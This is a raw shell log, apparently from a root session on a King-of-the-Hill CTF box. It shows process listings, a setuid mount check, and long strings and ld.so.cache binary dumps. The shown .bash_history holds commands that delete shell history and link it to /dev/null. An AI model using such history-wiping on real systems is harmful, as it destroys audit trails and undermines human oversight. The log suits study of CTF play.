root       792  0.3  2.5 557680 25204 ?        Ssl  22:31   0:06 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.1  1.6 723964 16128 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:08 /li
whereis mount
mount: /bin/mount /sbin/mount.fuse /sbin/mount.vmhgfs /sbin/mount.ntfs-3g /sbin/mount.ntfs /sbin/mount.lowntfs-3g /usr/share/man/man2/mount.2.gz /usr/share/man/man8/mount.8.gz
ls -la /bin/mount
-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
ls -lah /usr/bin/mount
ls: cannot access '/usr/bin/mount': No such file or directory

cd
ls -la
total 7264
drwx------  4 root root    4096 Dec  8 22:39 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
---x-----t  1 root root       3 Dec  8 22:39 .bash_history
-rw-r--r--  1 root root    3385 Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Dec  8 23:00 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Dec  8 23:03 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
strings /bin/mount
/lib64/ld-linux-x86-64.so.2
libmount.so.1
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
mnt_context_get_target
mnt_get_library_version
mnt_pretty_path
mnt_new_iter
mnt_table_set_cache
mnt_context_get_status
mnt_init_debug
mnt_context_is_nocanonicalize
mnt_unref_cache
mnt_context_set_mflags
mnt_context_next_mount
mnt_context_set_fstype_pattern
mnt_context_get_mflags
mnt_context_get_mtab
mnt_fs_get_srcpath
mnt_new_table
mnt_table_next_fs
mnt_free_context
mnt_context_set_fstab
mnt_fs_set_source
mnt_context_disable_helpers
mnt_context_enable_rwonly_mount
mnt_context_set_source
mnt_fs_get_source
mnt_context_disable_swapmatch
mnt_context_get_source
mnt_context_get_fs
mnt_fs_is_pseudofs
mnt_new_cache
mnt_context_set_tables_errcb
mnt_new_context
mnt_context_get_cache
mnt_context_get_excode
mnt_context_set_optsmode
mnt_tag_is_valid
mnt_context_set_options_pattern
mnt_table_parse_fstab
mnt_context_mount
mnt_context_is_fork
mnt_table_set_parser_errcb
mnt_context_enable_sloppy
mnt_fs_get_options
mnt_context_is_restricted
mnt_match_fstype
mnt_context_enable_fork
mnt_free_iter
mnt_context_get_options
mnt_context_append_options
mnt_get_library_features
mnt_context_enable_fake
mnt_cache_find_tag_value
mnt_context_wait_for_children
mnt_context_helper_executed
mnt_context_is_parent
mnt_context_is_verbose
mnt_context_enable_verbose
mnt_unref_table
mnt_fs_set_target
mnt_context_set_fstype
mnt_context_disable_canonicalize
mnt_fs_get_fstype
mnt_context_set_target
mnt_context_disable_mtab
mnt_fs_get_target
libc.so.6
__printf_chk
setlocale
fopen
strncmp
optind
strrchr
dcgettext
warnx
__stack_chk_fail
_exit
strspn
strdup
strtod
strtol
fgetc
fgets
strlen
prctl
localeconv
warn
strcspn
__errno_location
strndup
__fprintf_chk
stdout
fputc
fputs
memcpy
fclose
__strtol_internal
strtoul
malloc
realpath
setegid
getgid
__ctype_b_loc
optarg
stderr
__snprintf_chk
seteuid
getuid
getegid
getopt_long
getcwd
fwrite
geteuid
__fpending
strchr
secure_getenv
program_invocation_short_name
__cxa_finalize
__vasprintf_chk
__xstat
errx
bindtextdomain
access
strcmp
__libc_start_main
ferror
__strtoul_internal
free
__progname
__environ
__cxa_atexit
_init
_fini
_edata
__bss_start
_end
_IO_stdin_used
GLIBC_2.8
GLIBC_2.14
GLIBC_2.3
GLIBC_2.4
GLIBC_2.17
GLIBC_2.3.4
GLIBC_2.2.5
MOUNT_2.25
MOUNT_2.30
MOUNT_2.20
MOUNT_2.22
MOUNT_2.21
MOUNT_2.24
MOUNT_2.19
%zn 
%rn 
%jn 
%bn 
%Zn 
%Rn 
%Jn 
%Bn 
%:n 
%2n 
%*n 
%"n 
%zm 
%rm 
%jm 
%bm 
%Zm 
%Rm 
%Jm 
%Bm 
%:m 
%2m 
%*m 
%"m 
%zl 
%rl 
%jl 
%bl 
%Zl 
%Rl 
%Jl 
%Bl 
%:l 
%2l 
%*l 
%"l 
%zk 
%rk 
%jk 
%bk 
%Zk 
%Rk 
%Jk 
%Bk 
%:k 
%2k 
%*k 
%"k 
%Bk 
=9k 
AWAVAUATI
D$x1
D$8f
T$lL
=Ri 
=6i 
at[H
]vNI
=xh 
|$81
t$PH
=Zg 
|$ L
5Ce 
|$ H
t$xdH34%(
[]A\A]A^A_
t$`H
D$` 
D$,D	
t$XH
D$`D
l$8H
D$0H
D$,H
t$ H
|$`I
|$`H
t$ H
t$`H
D$`L
|$HL
t$D1
t$DH
l$LE
5Z^ 
T$LH
t$XH
l$XD
\$0D
|$XH
l$XH
t;H9\$`H
5,W 
=aV 
5ZV 
=AV 
T$0H
L$8L
D$@L
L$Ht7
)D$P
)L$`
)T$p
ATUSH
AUAT
[]A\A]
t;USH
St'H
u*[]A\
ATUSH
 upH
[]A\
ATUH
[]A\
ATUSH
dH34%(
[]A\
AVAUATUSH
[]A\A]A^
AWAVAUATUSH
[]A\A]A^A_
<$E1
AWAVL
AUATUSH
5QD 
[]A\A]A^A_
u-E1
/ujH
/t#H
AUATI
\t2Hc
[]A\A]
[]A\A]
AUATA
[]A\A]
AWAVAUATI
D$(1
t$(dH34%(
8[]A\A]A^A_
D$ H
\$ 1
T$ H
l$ A
L$ A
L$ H
T$ L
VUUU
UStT
[]A\
UStT
[]A\
AUATI
T$0H
L$8L
D$@L
L$HH
dH3<%(
X[]A\A]
ATUI
=&@ 
[]A\
=[? 
='> 
ATUI
[]A\
=W= 
=:= 
ATUI
[]A\
=j< 
$u9H
[]A\A]
[]A\A]
AUATUSH
D$81
\$8dH3
H[]A\A]
AWAVAUATUSH
<,th
t0L9
[]A\A]A^A_
[]A\A]A^A_
[]A\A]A^A_
w3<+t
AWAVAUATI
[]A\A]A^A_
[]A\A]A^A_
AVAUATI
x:I	
[]A\A]A^
]A\A]A^
AWAVAUATUSH
<$H9
-te1
[]A\A]A^A_
AVAUATUSH
<$/t
 []A\A]A^
AWAVAUATI
[]A\A]A^A_
[]A\A]A^A_
[]A\A]A^A_
T$@H
L$HL
D$PL
L$Xt:
)D$`
)L$p
D$(1
\$(dH3
AWAVAUATUSH
[]A\A]A^A_
AWAVI
AUATL
[]A\A]A^A_
cannot allocate string
only root can do that
%s: %s.
unsupported option format: %s
failed to append option '%s'
write error
fake
/usr/share/locale
util-linux
hlLUVvrist
 -%c
Usage:
Mount a filesystem.
Options:
display version
display this help
 -V, --version
 -h, --help
%-25s%s
%-25s%s
For more details see %s.
mount(8)
%s from %s (libmount %s
util-linux 2.31.1
failed to set options pattern
LABEL="%s"
UUID="%s"
%s: failed to parse
aBcfFhilL:Mno:O:rRsU:vVwt:T:
bad usage
failed to read mtab
%s on 
 type %s
 (%s)
LABEL
 [%s]
types
%-25s: ignored
%-25s: already mounted
%-25s: successfully mounted
%s: %s moved to %s.
%s: %s bound on %s.
none
%s: %s mounted on %s.
 --%s
fstab
fork
no-mtab
read-only
verbose
read-write
options
test-opts
uuid
label
move
rbind
make-shared
make-slave
make-private
make-unbindable
make-rshared
make-rslave
make-rprivate
make-runbindable
no-canonicalize
internal-only
show-labels
target
source
only root can use "--%s" option (effective UID is %u)
only root can do that (effective UID is %u)
only root can use "--%s" option
%s: parse error at line %d -- ignored
libmount context allocation failed
%s: mutually exclusive arguments:
 %1$s [-lhV]
 %1$s -a [options]
 %1$s [options] [--source] <source> | [--target] <directory>
 %1$s [options] <source> <directory>
 %1$s <operation> <mountpoint> [<target>]
 -a, --all               mount all filesystems mentioned in fstab
 -c, --no-canonicalize   don't canonicalize paths
 -f, --fake              dry run; skip the mount(2) syscall
 -F, --fork              fork off for each device (use with -a)
 -T, --fstab <path>      alternative file to /etc/fstab
 -i, --internal-only     don't call the mount.<type> helpers
 -l, --show-labels       show also filesystem labels
 -n, --no-mtab           don't write to /etc/mtab
 -o, --options <list>    comma-separated list of mount options
 -O, --test-opts <list>  limit the set of filesystems (use with -a)
 -r, --read-only         mount the filesystem read-only (same as -o ro)
 -t, --types <list>      limit the set of filesystem types
     --source <src>      explicitly specifies source (path, label, uuid)
     --target <target>   explicitly specifies mountpoint
 -v, --verbose           say what is being done
 -w, --rw, --read-write  mount the filesystem read-write (default)
Source:
 -L, --label <label>     synonym for LABEL=<label>
 -U, --uuid <uuid>       synonym for UUID=<uuid>
 LABEL=<label>           specifies device by filesystem label
 UUID=<uuid>             specifies device by filesystem UUID
 PARTLABEL=<label>       specifies device by partition label
 PARTUUID=<uuid>         specifies device by partition UUID
 <device>                specifies device by path
 <directory>             mountpoint for bind mounts (see --bind/rbind)
 <file>                  regular file for loopdev setup
Operations:
 -B, --bind              mount a subtree somewhere else (same as -o bind)
 -M, --move              move a subtree to some other place
 -R, --rbind             mount a subtree and all submounts somewhere else
 --make-shared           mark a subtree as shared
 --make-slave            mark a subtree as slave
 --make-private          mark a subtree as private
 --make-unbindable       mark a subtree as unbindable
 --make-rshared          recursively mark a whole subtree as shared
 --make-rslave           recursively mark a whole subtree as slave
 --make-rprivate         recursively mark a whole subtree as private
 --make-runbindable      recursively mark a whole subtree as unbindable
failed to initialize libmount table
Try '%s --help' for more information.
failed to initialize libmount iterator
%-25s: mount successfully forked
source specified more than once
%s: %s propagation flags changed.
/dm-
/sys/block/%s/dm/name
/dev/mapper/%s
BASH_ENV=
LANG=
LANGUAGE=
HOME=
IFS=
KRB_CONF=
LIBPATH=
MAIL=
NLSPATH=
SHELL=
SHLIB_PATH=
%s: '%s'
KMGTPEZY
kmgtpezy
BKMGTPE
%d%s%lu%s
%d%s
;*3$"
39ee2b6bc12cb6797cfbc248a4c9951a0ef829.debug
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.data.rel.ro
.dynamic
.data
.bss
.gnu_debuglink

ls -lah
total 7.1M
drwx------  4 root root 4.0K Dec  8 22:39 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
---x-----t  1 root root    3 Dec  8 22:39 .bash_history
-rw-r--r--  1 root root 3.4K Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root 4.0K Mar 19  2020 .local
-rw-------  1 root root  850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root  206 Mar 28  2020 .profile
drwx------  2 root root 4.0K Dec  8 23:00 .ssh
-rw-r--r--  1 root root  173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root   38 Mar 28  2020 flag
-r--r--r--  1 root root   11 Dec  8 23:04 king.txt
-rwxr-xr-x  1 root root 7.1M Mar 19  2020 koth
cat .bash_history
id
rm .bash_history
ln -s /dev/null .bash_history

cd /etc
ls -lah l*
-rw-r--r-- 1 root root       26K Mar 20  2020 ld.so.cache
-rw-r--r-- 1 root root        34 Jan 27  2016 ld.so.conf
-rw-r--r-- 1 root root       267 Apr  9  2018 legal
-rw-r--r-- 1 root root       191 Feb  7  2018 libaudit.conf
-rw-r--r-- 1 root root      3.0K Apr 16  2018 locale.alias
-rw-r--r-- 1 root root      9.2K Mar 19  2020 locale.gen
lrwxrwxrwx 1 root root        27 Mar 19  2020 localtime -> /usr/share/zoneinfo/Etc/UTC
-rw-r--r-- 1 root root       11K Jan 25  2018 login.defs
-rw-r--r-- 1 root root       703 Aug 21  2017 logrotate.conf
-rw-r--r-- 1 root root       105 Jan 30  2020 lsb-release
-rw-r--r-- 1 root root       15K Oct 13  2016 ltrace.conf

landscape:
total 8.0K
drwxrwxr-x  2 root landscape 4.0K Feb  8  2019 .
drwxr-xr-x 95 root root      4.0K Dec  8 23:00 ..

ld.so.conf.d:
total 20K
drwxr-xr-x  2 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root   38 Jan  8  2018 fakeroot-x86_64-linux-gnu.conf
-rw-r--r--  1 root root   44 Jan 27  2016 libc.conf
-rw-r--r--  1 root root  100 Apr 16  2018 x86_64-linux-gnu.conf

ldap:
total 12K
drwxr-xr-x  2 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root  332 Jul 26  2019 ldap.conf

libnl-3:
total 16K
drwxr-xr-x  2 root root 4.0K Mar 19  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root 1.2K Jun  2  2017 classid
-rw-r--r--  1 root root 1.5K Jun  2  2017 pktloc

logcheck:
total 24K
drwxr-xr-x  6 root root 4.0K Mar 19  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
drwxr-xr-x  2 root root 4.0K Mar 19  2020 ignore.d.paranoid
drwxr-xr-x  2 root root 4.0K Mar 20  2020 ignore.d.server
drwxr-xr-x  2 root root 4.0K Mar 19  2020 ignore.d.workstation
drwxr-xr-x  2 root root 4.0K Mar 20  2020 violations.d

logrotate.d:
total 44K
drwxr-xr-x  2 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root  120 Nov  2  2017 alternatives
-rw-r--r--  1 root root  126 Nov 20  2017 apport
-rw-r--r--  1 root root  173 Apr 20  2018 apt
-rw-r--r--  1 root root  112 Nov  2  2017 dpkg
-rw-r--r--  1 root root  146 Nov 23  2018 lxd
-rw-r--r--  1 root root  845 Jan 12  2018 mysql-server
-rw-r--r--  1 root root  501 Jan 14  2018 rsyslog
-rw-r--r--  1 root root  178 Aug 15  2017 ufw
-rw-r--r--  1 root root  235 Apr 29  2019 unattended-upgrades

lvm:
total 112K
drwxr-xr-x  3 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root  93K Jun  4  2019 lvm.conf
-rw-r--r--  1 root root 2.3K Jun  4  2019 lvmlocal.conf
drwxr-xr-x  2 root root 4.0K Mar 20  2020 profile
ls -lah ld*
-rw-r--r-- 1 root root  26K Mar 20  2020 ld.so.cache
-rw-r--r-- 1 root root   34 Jan 27  2016 ld.so.conf

ld.so.conf.d:
total 20K
drwxr-xr-x  2 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root   38 Jan  8  2018 fakeroot-x86_64-linux-gnu.conf
-rw-r--r--  1 root root   44 Jan 27  2016 libc.conf
-rw-r--r--  1 root root  100 Apr 16  2018 x86_64-linux-gnu.conf

ldap:
total 12K
drwxr-xr-x  2 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root  332 Jul 26  2019 ldap.conf
cat ld.so.cache
ld.so-1.7.0. ...........%.......L...V.......v.......................................+.......R...b...........................................8...E.......l...|...............................................).......L...W.......|...................................&...<.......l............................ ......: ..K ......r ... ....... ... ....... ... .......!...!......>!..J!......p!..|!.......!...!.......!...!......
"..."......D"..R"......z"..."......."..."......."...".......#...#......X#..c#.......#...#.......#...#.......#...$......*$..:$......d$..r$.......$...$.......$...$.......%...%......>%..L%......t%...%.......%...%.......%...%.......&...&......8&..G&......l&..y&.......&...&.......&...&.......'..!'......L'..\'.......'...'.......'...'.......(...(......2(..A(......f(..s(.......(...(.......(...(......2)..I)......z)...).......)...).......)...).......*..F*......t*...*.......*...*.......*...+......0+..B+......n+..{+.......+...+.......+...+.......,...,......:,..I,......n,..},.......,...,.......,...,.......-...-......>-..O-......v-...-.......-...-.......-...-......&...7.......^...r................................/..(/......N/..\/......./.../......./.../......./...0......60..F0......p0...0.......0...0.......0...0.......1..)1......T1..`1.......1...1.......1...1.......1...1.......2..,2......V2..b2.......2...2.......2...2.......2...3......43..C3......l3...3.......3...3.......3...4......,4..94......\4..g4.......4...4.......4...4.......5...5......85..E5......l5..z5.......5...5.......5...5.......6...6......46..B6......j6..w6.......6...6.......6...6.......7...7......87..B7......b7..n7.......7...7.......7...7.......7...8......&8..68......`8..s8.......8...8.......8...8......
9...9......J9..[9.......9...9.......9...9.......9..
:......8:..F:......n:..{:.......:...:.......:...:......
;...;......>;..J;......p;..};.......;...;.......;...;.......<..+<......V<..f<.......<...<.......<...<......
=...=......J=..X=.......=...=.......=...=.......=...=...... >..->......T>..a>.......>...>.......>...>.......>...?......0?..A?......l?..{?.......?...?.......?...?.......@..&@......P@..`@.......@...@.......@...@.......@...@.......A..,A......WA..gA.......A...A.......A...A.......A...A......!B..5B......cB..rB.......B...B.......B...B.......C...C......;C..OC......}C...C.......C...C.......C...C......-D..>D......iD...D.......D...D.......D...E......1E..>E......eE..uE.......E...E.......E...E.......E..
F......7F..HF......sF...F.......F...F.......F...F......
G...G......?G..MG......qG...G.......G...G.......G...H......#H..2H......WH..eH.......H...H.......H...H.......H...I......?I..QI......}I...I.......I...I.......I...I.......J..)J......UJ..eJ.......J...J.......J...J.......J..
K......3K..IK......yK...K.......K...K.......K...K.......L..*L......WL..tL.......L...L.......L...M......WM..vM.......M...M.......N..#N......YN..oN.......N...N.......N...N.......O.."O......IO..VO......}O...O.......O...O.......O...P......9P..LP......yP...P.......P...P.......P...P.......Q..#Q......MQ..ZQ......}Q...Q.......Q...Q.......Q...Q......
R...R......AR..KR......kR..yR.......R...R.......R...R.......S...S......3S..AS......eS..uS.......S...S.......S...S.......T..$T......GT..VT.......T...T.......T...T.......T...T.......U..&U......MU..\U.......U...U.......U...U......	V...V......IV..ZV.......V...V.......V...V.......V...V.......W...W......9W..QW.......W...W.......W...W.......W...W.......X..+X......SX.._X.......X...X.......X...X.......X...Y.......Y..1Y......\Y..oY.......Y...Y.......Y...Y..glibc-ld.so.cache1.1.....>..............................%...................L...V...................v...........................................................................+...................R...b...........................................................................................8...E...................l...|...............................................................................................)...................L...W...................|.......................................................................&...<...................l.................................................... ..................: ..K ..................r ... ................... ... ................... ... ...................!...!..................>!..J!..................p!..|!...................!...!...................!...!..................
"..."..................D"..R"..................z"..."..................."..."..................."..."...................#...#..................X#..c#...................#...#...................#...#...................#...$..................*$..:$..................d$..r$...................$...$...................$...$...................%...%..................>%..L%..................t%...%...................%...%...................%...%...................&...&..................8&..G&..................l&..y&...................&...&...................&...&...................'..!'..................L'..\'...................'...'...................'...'...................(...(..................2(..A(..................f(..s(...................(...(...................(...(..................2)..I)..................z)...)...................)...)...................)...)...................*..F*..................t*...*...................*...*...................*...+..................0+..B+..................n+..{+...................+...+...................+...+...................,...,..................:,..I,..................n,..},...................,...,...................,...,...................-...-..................>-..O-..................v-...-...................-...-...................-...-..................&...7...................^...r..................................................................../..(/..................N/..\/.................../.../.................../.../.................../...0..................60..F0..................p0...0...................0...0...................0...0...................1..)1..................T1..`1...................1...1...................1...1...................1...1...................2..,2..................V2..b2...................2...2...................2...2...................2...3..................43..C3..................l3...3...................3...3...................3...4..................,4..94..................\4..g4...................4...4...................4...4...................5...5..................85..E5..................l5..z5...................5...5...................5...5...................6...6..................46..B6..................j6..w6...................6...6...................6...6...................7...7..................87..B7..................b7..n7...................7...7...................7...7...................7...8..................&8..68..................`8..s8...................8...8...................8...8..................
9...9..................J9..[9...................9...9...................9...9...................9..
:..................8:..F:..................n:..{:...................:...:...................:...:..................
;...;..................>;..J;..................p;..};...................;...;...................;...;...................<..+<..................V<..f<...................<...<...................<...<..................
=...=..................J=..X=...................=...=...................=...=...................=...=.................. >..->..................T>..a>...................>...>...................>...>...................>...?..................0?..A?..................l?..{?...................?...?...................?...?...................@..&@..................P@..`@...................@...@...................@...@...................@...@...................A..,A..................WA..gA...................A...A...................A...A...................A...A..................!B..5B..................cB..rB...................B...B...................B...B...................C...C..................;C..OC..................}C...C...................C...C...................C...C..................-D..>D..................iD...D...................D...D...................D...E..................1E..>E..................eE..uE...................E...E...................E...E...................E..
F..................7F..HF..................sF...F...................F...F...................F...F..................
G...G..................?G..MG..................qG...G...................G...G...................G...H..................#H..2H..................WH..eH...................H...H...................H...H...................H...I..................?I..QI..................}I...I...................I...I...................I...I...................J..)J..................UJ..eJ...................J...J...................J...J...................J..
K..................3K..IK..................yK...K...................K...K...................K...K...................L..*L..................WL..tL...................L...L...................L...M..................WM..vM...................M...M...................N..#N..................YN..oN...................N...N...................N...N...................O.."O..................IO..VO..................}O...O...................O...O...................O...P..................9P..LP..................yP...P...................P...P...................P...P...................Q..#Q..................MQ..ZQ..................}Q...Q...................Q...Q...................Q...Q..................
R...R..................AR..KR..................kR..yR...................R...R...................R...R...................S...S..................3S..AS..................eS..uS...................S...S...................S...S...................T..$T..................GT..VT...................T...T...................T...T...................T...T...................U..&U..................MU..\U...................U...U...................U...U..................	V...V..................IV..ZV...................V...V...................V...V...................V...V...................W...W..................9W..QW...................W...W...................W...W...................W...W...................X..+X..................SX.._X...................X...X...................X...X...................X...Y...................Y..1Y..................\Y..oY...................Y...Y..............libzstd.so.1./usr/lib/x86_64-linux-gnu/libzstd.so.1.libz.so.1./lib/x86_64-linux-gnu/libz.so.1.libyaml-0.so.2./usr/lib/x86_64-linux-gnu/libyaml-0.so.2.libxtables.so.12./usr/lib/x86_64-linux-gnu/libxtables.so.12.libxslt.so.1./usr/lib/x86_64-linux-gnu/libxslt.so.1.libxml2.so.2./usr/lib/x86_64-linux-gnu/libxml2.so.2.libxmlsec1.so.1./usr/lib/x86_64-linux-gnu/libxmlsec1.so.1.libxmlsec1-openssl.so.1./usr/lib/x86_64-linux-gnu/libxmlsec1-openssl.so.1.libxcb.so.1./usr/lib/x86_64-linux-gnu/libxcb.so.1.libwrap.so.0./lib/x86_64-linux-gnu/libwrap.so.0.libwind.so.0./usr/lib/x86_64-linux-gnu/libwind.so.0.libvmtools.so.0./usr/lib/libvmtools.so.0.libvgauth.so.0./usr/lib/libvgauth.so.0.libuv.so.1./usr/lib/x86_64-linux-gnu/libuv.so.1.libuuid.so.1./lib/x86_64-linux-gnu/libuuid.so.1.libutil.so.1./lib/x86_64-linux-gnu/libutil.so.1.libutil.so./usr/lib/x86_64-linux-gnu/libutil.so.libutempter.so.0./usr/lib/x86_64-linux-gnu/libutempter.so.0.libusb-1.0.so.0./lib/x86_64-linux-gnu/libusb-1.0.so.0.libunwind.so.8./usr/lib/x86_64-linux-gnu/libunwind.so.8.libunwind-x86_64.so.8./usr/lib/x86_64-linux-gnu/libunwind-x86_64.so.8.libunwind-ptrace.so.0./usr/lib/x86_64-linux-gnu/libunwind-ptrace.so.0.libunwind-coredump.so.0./usr/lib/x86_64-linux-gnu/libunwind-coredump.so.0.libunistring.so.2./usr/lib/x86_64-linux-gnu/libunistring.so.2.libulockmgr.so.1./lib/x86_64-linux-gnu/libulockmgr.so.1.libudev.so.1./lib/x86_64-linux-gnu/libudev.so.1.libubsan.so.0./usr/lib/x86_64-linux-gnu/libubsan.so.0.libtsan.so.0./usr/lib/x86_64-linux-gnu/libtsan.so.0.libtinfo.so.5./lib/x86_64-linux-gnu/libtinfo.so.5.libtinfo.so./usr/lib/x86_64-linux-gnu/libtinfo.so.libtic.so.5./usr/lib/x86_64-linux-gnu/libtic.so.5.libtic.so./usr/lib/x86_64-linux-gnu/libtic.so.libthread_db.so.1./lib/x86_64-linux-gnu/libthread_db.so.1.libthread_db.so./usr/lib/x86_64-linux-gnu/libthread_db.so.libtasn1.so.6./usr/lib/x86_64-linux-gnu/libtasn1.so.6.libsystemd.so.0./lib/x86_64-linux-gnu/libsystemd.so.0.libstdc++.so.6./usr/lib/x86_64-linux-gnu/libstdc++.so.6.libssl.so.1.1./usr/lib/x86_64-linux-gnu/libssl.so.1.1.libssl.so.1.0.0./usr/lib/x86_64-linux-gnu/libssl.so.1.0.0.libss.so.2./lib/x86_64-linux-gnu/libss.so.2.libsqlite3.so.0./usr/lib/x86_64-linux-gnu/libsqlite3.so.0.libsmartcols.so.1./lib/x86_64-linux-gnu/libsmartcols.so.1.libslang.so.2./lib/x86_64-linux-gnu/libslang.so.2.libsigsegv.so.2./usr/lib/x86_64-linux-gnu/libsigsegv.so.2.libsepol.so.1./lib/x86_64-linux-gnu/libsepol.so.1.libsemanage.so.1./usr/lib/x86_64-linux-gnu/libsemanage.so.1.libselinux.so.1./lib/x86_64-linux-gnu/libselinux.so.1.libseccomp.so.2./lib/x86_64-linux-gnu/libseccomp.so.2.libsasl2.so.2./usr/lib/x86_64-linux-gnu/libsasl2.so.2.librtmp.so.1./usr/lib/x86_64-linux-gnu/librtmp.so.1.librt.so.1./lib/x86_64-linux-gnu/librt.so.1.librt.so./usr/lib/x86_64-linux-gnu/librt.so.libroken.so.18./usr/lib/x86_64-linux-gnu/libroken.so.18.libresolv.so.2./lib/x86_64-linux-gnu/libresolv.so.2.libresolv.so./usr/lib/x86_64-linux-gnu/libresolv.so.libreadline.so.7./lib/x86_64-linux-gnu/libreadline.so.7.libreadline.so.5./lib/x86_64-linux-gnu/libreadline.so.5.libquadmath.so.0./usr/lib/x86_64-linux-gnu/libquadmath.so.0.libp11-kit.so.0./usr/lib/x86_64-linux-gnu/libp11-kit.so.0.libpython3.6m.so.1.0./usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0.libpthread.so.0./lib/x86_64-linux-gnu/libpthread.so.0.libpsl.so.5./usr/lib/x86_64-linux-gnu/libpsl.so.5.libprocps.so.6./lib/x86_64-linux-gnu/libprocps.so.6.libpopt.so.0./usr/lib/x86_64-linux-gnu/libpopt.so.0.libpolkit-gobject-1.so.0./usr/lib/x86_64-linux-gnu/libpolkit-gobject-1.so.0.libpolkit-backend-1.so.0./usr/lib/x86_64-linux-gnu/libpolkit-backend-1.so.0.libpolkit-agent-1.so.0./usr/lib/x86_64-linux-gnu/libpolkit-agent-1.so.0.libpng16.so.16./usr/lib/x86_64-linux-gnu/libpng16.so.16.libply.so.4./lib/x86_64-linux-gnu/libply.so.4.libply-splash-graphics.so.4./lib/x86_64-linux-gnu/libply-splash-graphics.so.4.libply-splash-core.so.4./lib/x86_64-linux-gnu/libply-splash-core.so.4.libply-boot-client.so.4./lib/x86_64-linux-gnu/libply-boot-client.so.4.libpipeline.so.1./usr/lib/x86_64-linux-gnu/libpipeline.so.1.libperl.so.5.26./usr/lib/x86_64-linux-gnu/libperl.so.5.26.libpcreposix.so.3./usr/lib/x86_64-linux-gnu/libpcreposix.so.3.libpcre.so.3./lib/x86_64-linux-gnu/libpcre.so.3.libpcprofile.so./lib/x86_64-linux-gnu/libpcprofile.so.libpci.so.3./lib/x86_64-linux-gnu/libpci.so.3.libpcap.so.0.8./usr/lib/x86_64-linux-gnu/libpcap.so.0.8.libparted.so.2./lib/x86_64-linux-gnu/libparted.so.2.libpanelw.so.5./usr/lib/x86_64-linux-gnu/libpanelw.so.5.libpanel.so.5./usr/lib/x86_64-linux-gnu/libpanel.so.5.libpanel.so./usr/lib/x86_64-linux-gnu/libpanel.so.libpamc.so.0./lib/x86_64-linux-gnu/libpamc.so.0.libpam_misc.so.0./lib/x86_64-linux-gnu/libpam_misc.so.0.libpam.so.0./lib/x86_64-linux-gnu/libpam.so.0.libopcodes-2.30-system.so./usr/lib/x86_64-linux-gnu/libopcodes-2.30-system.so.libnuma.so.1./usr/lib/x86_64-linux-gnu/libnuma.so.1.libntfs-3g.so.88./lib/x86_64-linux-gnu/libntfs-3g.so.88.libnss_systemd.so.2./lib/x86_64-linux-gnu/libnss_systemd.so.2.libnss_nisplus.so.2./lib/x86_64-linux-gnu/libnss_nisplus.so.2.libnss_nisplus.so./usr/lib/x86_64-linux-gnu/libnss_nisplus.so.libnss_nis.so.2./lib/x86_64-linux-gnu/libnss_nis.so.2.libnss_nis.so./usr/lib/x86_64-linux-gnu/libnss_nis.so.libnss_hesiod.so.2./lib/x86_64-linux-gnu/libnss_hesiod.so.2.libnss_hesiod.so./usr/lib/x86_64-linux-gnu/libnss_hesiod.so.libnss_files.so.2./lib/x86_64-linux-gnu/libnss_files.so.2.libnss_files.so./usr/lib/x86_64-linux-gnu/libnss_files.so.libnss_dns.so.2./lib/x86_64-linux-gnu/libnss_dns.so.2.libnss_dns.so./usr/lib/x86_64-linux-gnu/libnss_dns.so.libnss_compat.so.2./lib/x86_64-linux-gnu/libnss_compat.so.2.libnss_compat.so./usr/lib/x86_64-linux-gnu/libnss_compat.so.libnsl.so.1./lib/x86_64-linux-gnu/libnsl.so.1.libnsl.so./us